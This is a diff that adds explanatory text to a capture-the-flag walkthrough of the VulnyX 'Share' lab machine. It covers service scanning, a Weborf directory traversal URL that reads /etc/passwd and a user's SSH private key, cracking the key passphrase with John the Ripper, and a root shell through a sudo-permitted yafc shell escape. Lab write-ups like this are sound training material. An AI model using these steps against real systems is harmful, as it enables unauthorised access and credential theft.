@@ -6,6 +6,7 @@
 ## Solution
 ### Enumeration
 #### Nmap
+We start with a full port scan and service version detection to understand the attack surface
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nmap -sCV -p- -T4 192.168.100.139
@@ -97,10 +98,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 160.44 seconds
 ```
+Result:
+- Port 22: OpenSSH 8.4p1 (Debian 11)
+- Port 80: Apache httpd 2.4.56 (default "it works' page)
+- Port 8080: Weborf 0.12.2 with **WebDAV** enabled and risky methods allowed (PUT, DELETE,...)
 
+
+**Weborf** is unusual on port 8080 and expose directory listings of temporary systemd-private directories. 
 ![weborf](/walkthroughs/vulnyx/low-difficulty/share/Weborf.png)
 
-```bash
+#### Discovering the Vulnerability
+We search for known exploits against the identified service:
+```bash 
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ searchsploit weborf 0.12.2         
 --------------------------------------------------- ---------------------------------
@@ -110,7 +119,11 @@ weborf 0.12.2 - Directory Traversal                | linux/remote/14925.txt
 Weborf HTTP Server - Denial of Service             | multiple/dos/14012.txt
 --------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-                                                                                     
+```
+**SearchSploit** queries the Exploit-DB database locally to quickly find public exploits matching the exact version. 
+
+We find CVE-2010-3306 - a **Directory Traversal** vulnerability in Weborf 0.12.2
+```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ searchsploit -m 14925     
   Exploit: weborf 0.12.2 - Directory Traversal
@@ -123,24 +136,34 @@ Copied to: /tmp/14925.txt
 
 ```
 ![exploit](/walkthroughs/vulnyx/low-difficulty/share/exploit.png)
+The vulnerability allows us to read arbitrary files outside the web root by using sequences like `..%2f` (URL encoded `../`).
 
+We exploit the vulnerability and open the `/etc/passwd` file to view the system users and see the user `tim`.
 ![exploit](/walkthroughs/vulnyx/low-difficulty/share/exploit-1.png)
 
+
+
 ### Shell (tim)
+By traversing the filesystem via the Weborf server on port 8080, we located and download the SSH private key of user `tim`:
+- The key is usually found at a path similar to : `http://192.168.100.139:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2ftim%2f.ssh%2fid_rsa`
+
 ![exploit](/walkthroughs/vulnyx/low-difficulty/share/id_rsa_tim.png)
 
+We prepare the private key:
 ```bash
-┌──(dungcngo㉿kali)-[/tmp]
+┌──(dungcngo㉿kali)-[/tmp]   # Paste the downloaded key
 └─$ nano id_rsa                      
                                                                                      
 ┌──(dungcngo㉿kali)-[/tmp]
-└─$ chmod 600 id_rsa
+└─$ chmod 600 id_rsa         # Secure persmissions required by SSH
                                                                                      
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ls -la id_rsa
 -rw------- 1 dungcngo dungcngo 1751 Apr 20 21:45 id_rsa
-                                                                                     
-┌──(dungcngo㉿kali)-[/tmp]
+```
+
+Convert the passphrase-protected key into crackable hash and crack it using **John the Ripper** with the `rockyou.txt`:
+```bash                                                                         ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ssh2john id_rsa > tim.hash         
                                                                                                                                             
 ┌──(dungcngo㉿kali)-[/tmp]
@@ -156,7 +179,9 @@ ilovetim         (id_rsa)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+Password: `ilovetim`.
 
+Now connect using the SSH private key:
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ssh -i id_rsa tim@192.168.100.139
@@ -180,6 +205,7 @@ share
 
 ### Privilege Escalation 
 #### Enumeration
+Check what commands the current user can run with elevated privileges:
 ```bash
 tim@share:~$ sudo -l
 Matching Defaults entries for tim on share:
@@ -189,8 +215,10 @@ Matching Defaults entries for tim on share:
 User tim may run the following commands on share:
     (root) NOPASSWD: /usr/bin/yafc
 ```
+`yafc` (Yet Another FTP Client) version 1.3.7 is allowed to run as root without password. Many older interactive programs can be abused to spawn a shell if they support command execution features.
 
 #### Abuse
+Run the allowed binary. Then, inside the `yafc` prompt, use the shell escape feature:
 ```bash
 tim@share:~$ sudo yafc
 yafc 1.3.7
@@ -202,6 +230,7 @@ yafc> !/bin/sh
 uid=0(root) gid=0(root) grupos=0(root)
 share
 ```
+`yafc` allows executing local commands with the `!` prefix. Because it runs as `root` via `sudo` (NOPASSWD), the spawned shell inherits `root` privileges.
 
 #### Flags
 ```bash
